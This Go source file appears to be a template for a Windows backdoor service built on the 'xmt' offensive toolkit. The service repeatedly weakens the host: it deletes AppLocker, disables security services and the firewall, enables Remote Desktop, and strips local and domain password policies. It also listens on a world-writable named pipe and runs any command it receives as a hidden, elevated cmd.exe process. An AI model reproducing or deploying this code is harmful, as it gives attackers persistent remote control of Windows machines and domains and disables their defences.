// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"context"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/regedit"
	"github.com/iDigitalFlame/xmt/util"
)

var admin = filter.F().SetElevated(true).SetSession(false)

func main() {
	defer func() {
		if err := recover(); err != nil {
			device.GoExit()
		}
	}()
	var z bool
	if $critical {
		z, _ = device.SetCritical(true)
	}
	limits.MemorySweep(context.Background())
	if device.Daemon(`$service`, listen); !z {
		device.SetCritical(false)
	}
	device.GoExit()
}
func unHarden() {
	os.RemoveAll("C:\\Windows\\System32\\AppLocker")
	regedit.SetDword("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AppIDSvc", "Start", 4)
	regedit.SetDword("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\TermService", "Start", 2)
	regedit.SetDword("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "Start", 4)
	regedit.SetDword("HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", 1)
	regedit.SetDword("HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0)
	execCmd("netsh firewall set opmode disable")
	execCmd("netsh advfirewall set allprofiles state off")
	execCmd("sc start Server")
	execCmd("sc start TermService")
	execCmd("sc stop AppIDSvc")
	execCmd("net accounts /FORCELOGOFF:NO")
	execCmd("net accounts /MINPWLEN:1")
	execCmd("net accounts /MINPWAGE:0")
	execCmd("net accounts /MAXPWAGE:UNLIMITED")
	execCmd("net accounts /UNIQUEPW:0")
	execCmd("net accounts /FORCELOGOFF:NO /DOMAIN")
	execCmd("net accounts /MINPWLEN:1 /DOMAIN")
	execCmd("net accounts /MINPWAGE:0 /DOMAIN")
	execCmd("net accounts /MAXPWAGE:UNLIMITED /DOMAIN")
	execCmd("net accounts /UNIQUEPW:0 /DOMAIN")
	execCmd("wmic UserAccount set PasswordExpires=False")
}
func execCmd(s string) {
	p := &cmd.Process{Args: []string{"cmd.exe", "/c", s}, Dir: "C:\\"}
	p.SetNoWindow(true)
	p.SetWindowDisplay(0)
	p.SetParent(filter.Any)
	p.Run()
}
func listen(x context.Context) error {
	go func() {
		for t := time.NewTicker(time.Minute * 2); ; {
			select {
			case <-t.C:
				unHarden()
			case <-x.Done():
				t.Stop()
			}
		}
	}()
	var (
		b      util.Builder
		l, err = pipe.ListenPermsContext(x, pipe.Format(`$pipe`), pipe.PermEveryone)
	)
	if err != nil {
		return err
	}
	for {
		c, err := l.Accept()
		if err != nil {
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if ok && !e.Timeout() {
				break
			}
			continue
		}
		n, _ := io.Copy(&b, c)
		if c.Close(); n == 0 {
			continue
		}
		e := &cmd.Process{Args: []string{"cmd.exe", "/c", strings.ReplaceAll(b.Output(), "\n", "")}, Dir: "C:\\"}
		e.SetNoWindow(true)
		e.SetWindowDisplay(0)
		e.SetParent(admin)
		e.Start()
		e.Release()
	}
	return nil
}
